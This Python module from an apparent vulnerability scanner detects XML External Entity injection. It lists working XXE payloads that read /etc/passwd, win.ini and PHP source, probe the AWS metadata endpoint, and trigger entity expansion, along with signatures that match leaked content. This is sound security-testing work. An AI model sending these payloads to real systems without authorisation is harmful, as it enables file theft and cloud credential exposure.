"""XXE (XML External Entity) injection detection with DTD handling."""

from __future__ import annotations

from basilisk.models import Finding
from basilisk.scoring import score_finding


XXE_PAYLOADS = [
    # Classic file read
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    # Parameter entity
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1:8080/xxe">%xxe;]><foo>test</foo>',
    # PHP wrapper
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
    # Billion laughs (DoS detection)
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;">]><lolz>&lol3;</lolz>',
    # SSRF via XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    # SVG XXE
    '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
    # Excel/XLSX XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><Workbook><sheets><sheet>&xxe;</sheet></sheets></Workbook>',
]

XXE_SIGNATURES = [
    "root:x:", "daemon:x:", "bin:x:",  # /etc/passwd
    "[extensions]", "for 16-bit app support",  # win.ini
    "<?php", "<?=",  # PHP source
    "ec2", "meta-data", "iam",  # AWS metadata
    "ami-id", "instance-id",  # AWS instance
]

XXE_ERROR_SIGNATURES = [
    "xml parsing error", "xmlsyntaxerror", "saxparseexception",
    "xmlreader", "xml declaration", "dtd not allowed",
    "external entity", "entity reference", "undefined entity",
    "not well-formed", "premature end",
]


def detect_xxe(response: dict, payload: str) -> Finding | None:
    """Evaluate a response for XXE indicators."""
    body = response.get("body", "")
    status = response.get("status_code", 0)
    target = response.get("url", "")

    # Check for file content leakage
    for sig in XXE_SIGNATURES:
        if sig in body:
            cvss, vector = score_finding("xxe")
            return Finding(
                vulnerability="XML External Entity Injection (XXE)",
                severity="Critical",
                description=f"File content leaked via XXE: '{sig}' found for payload: {payload[:60]}",
                target=target,
                attack_type="xxe",
                payload=payload,
                cvss_score=cvss,
                cvss_vector=vector,
                remediation="Disable DTD processing and external entity resolution in XML parsers.",
            )

    # Check for XML parsing errors (indicates XML is processed)
    lower_body = body.lower()
    for err_sig in XXE_ERROR_SIGNATURES:
        if err_sig in lower_body:
            cvss, vector = score_finding("xxe")
            return Finding(
                vulnerability="Potential XXE (XML Parser Error)",
                severity="Medium",
                description=f"XML parsing error '{err_sig}' suggests XML processing for: {payload[:60]}",
                target=target,
                attack_type="xxe",
                payload=payload,
                cvss_score=cvss,
                cvss_vector=vector,
                confidence=0.6,
                remediation="Review XML parsing configuration and disable external entities.",
            )

    # Server error on XML payload
    if status == 500 and "xml" in payload.lower()[:50]:
        cvss, vector = score_finding("xxe")
        return Finding(
            vulnerability="Potential XXE (Server Error)",
            severity="Medium",
            description=f"HTTP 500 on XML payload: {payload[:60]}",
            target=target,
            attack_type="xxe",
            payload=payload,
            cvss_score=cvss,
            cvss_vector=vector,
            confidence=0.4,
        )

    return None


def get_payloads() -> list[str]:
    return list(XXE_PAYLOADS)
